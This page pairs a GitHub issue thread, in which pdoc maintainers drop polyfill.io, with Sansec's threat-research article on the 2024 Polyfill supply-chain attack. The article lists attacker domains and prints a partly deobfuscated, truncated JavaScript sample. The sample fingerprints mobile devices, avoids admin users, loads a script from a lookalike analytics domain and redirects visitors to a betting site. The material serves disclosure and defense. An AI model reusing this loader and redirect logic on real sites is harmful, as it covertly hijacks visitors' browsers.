The polyfill.io website has been reported to serve malicious code. ([reference](https://sansec.io/research/polyfill-supply-chain-attack) and [GitHub issue](https://github.com/polyfillpolyfill/polyfill-service/issues/2873#issuecomment-2143228377))

I do not think there is a need for these es6 polyfills because es6 has been supported in browsers for the past 9 years.

Sorry, something went wrong.

Thank you again for the report!  I will now do some digging how this made it in the in the first place. I typically avoid CDNs where possible, but I vaguely recall that this was tricky with MathJax. |

| After doing some more digging, we included polyfill.io here because that is what's recommended on <https://www.mathjax.org/#gettingstarted>. I've flagged the latest developments at [mathjax/MathJax-docs#334](https://github.com/mathjax/MathJax-docs/issues/334).  We're still using jsdelivr for MathJax and Mermaid diagrams if those features are enabled (they are off by default). I'm much less worried about jsdelivr, but we should take a look again if there is a good way for us to embed both of them into pdoc without massively bloating our output. |

# Polyfill supply chain attack hits 100K+ sites

![Sansec](/assets/images/sansec-social.svg)

by Sansec Forensics Team

Published in [Threat Research](/research) − June 25, 2024

The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites.

![Polyfill supply chain attack hits 100K+ sites](/assets/2023/og/720/og-graphic-3.webp)**Update June 28th**: We are flagging more domains that have been used by the same actor to spread malware since at least [June 2023](https://x.com/nullifysecurity/status/1806489013567778923): `bootcdn.net`, `bootcss.com`, `staticfile.net`, `staticfile.org`, `unionadjs.com`, `xhsbpza.com`, `union.macoms.la`, `newcrbpc.com`.**Update June 27th**: Cloudflare has implemented real-time rewrites of cdn.polyfill.io to their own version. A little later, Namecheap has put the domain on hold altogether, which eliminates the risk for now. However, you are still recommended to remove any polyfill.io references in your code.**Update June 26th**: Someone launched similar DDoS attacks against our infrastructure and BleepingComputer (who was the first to cover our research).**Update June 25th**: Google has already started blocking Google Ads for eCommerce sites that use polyfill.io.

The `polyfill.js` is a popular open source library to support older browsers. [100K+ sites](https://publicwww.com/websites/%22cdn.polyfill.io%22/) embed it using the `cdn.polyfill.io` domain. Notable users are JSTOR, Intuit and World Economic Forum. However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting [malware](https://web.archive.org/web/20240624110153/https%3A//github.com/polyfillpolyfill/polyfill-service/issues/2873) on mobile devices via any site that embeds `cdn.polyfill.io`. Any complaints were quickly removed ([archive here](https://web.archive.org/web/20240229113710/https%3A//github.com/polyfillpolyfill/polyfill-service/issues/2834)) from the Github repository.

The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely. Sansec decoded one particular malware (see below) which redirects mobile users to a [sports betting site](https://w9.vty70.net/) using a fake Google analytics domain (`www.googie-anaiytics.com`). The code has specific protection against reverse engineering, and only activates on specific mobile devices at specific hours. It also does not activate when it detects an admin user. It also delays execution when a web analytics service is found, presumably to not end up in the stats.

The original [polyfill author](https://x.com/triblondon/status/1761852117579427975) recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway. Meanwhile, both [Fastly](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540) and [Cloudflare](https://cdnjs.cloudflare.com/polyfill) have put up trustworthy alternatives, if you still need it.

This incident is a typical example of a supply chain attack. To get visibility into the code that your users are loading, we recommend our (free) CSP monitoring service [Sansec Watch](/watch).

Our [eComscan backend scanner](/#ecomscan) has also been updated with [polyfill.io](https://polyfill.io) detection.

## Polyfill malicious payload example

We added some names for readability, however `tiaozhuan` came from the original malware (which means "jump" in Chinese).

```
function isPc() {
  try {
    var _isWin =
        navigator.platform == "Win32" || navigator.platform == "Windows",
      _isMac =
        navigator.platform == "Mac68K" ||
        navigator.platform == "MacPPC" ||
        navigator.platform == "Macintosh" ||
        navigator.platform == "MacIntel";
    if (_isMac || _isWin) {
      return true;
    } else {
      return false;
    }
  } catch (_0x44e1f6) {
    return false;
  }
}
function vfed_update(_0x5ae1f8) {
  _0x5ae1f8 !== "" &&
    loadJS(
      "https://www.googie-anaiytics.com/html/checkcachehw.js",
      function () {
        if (usercache == true) {
          window.location.href = _0x5ae1f8;
        }
      }
    );
}
function check_tiaozhuan() {
  var _isMobile = navigator.userAgent.match(
    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i

            }
          } else {
            if (_hours >= 2 && _hours < 4) {
              _rnd <= 15 && (_redirectURL = _kuurzaBitGet);
            } else {
              if (_hours >= 4 && _hours < 7) {
                _rnd <= 20 && (_redirectURL = _kuurzaBitGet);

                  ? _rnd <= 10 && (_redirectURL = _kuurzaBitGet)
                  : _rnd <= 10 && (_redirectURL = _kuurzaBitGet);
              }
            }
          }
        }
      }
    }
    _redirectURL != "" &&
      !isPc() &&
      document.cookie.indexOf("admin_id") == -1 &&
      document.cookie.indexOf("adminlevels") == -1 &&
      vfed_update(_redirectURL);
  }
}
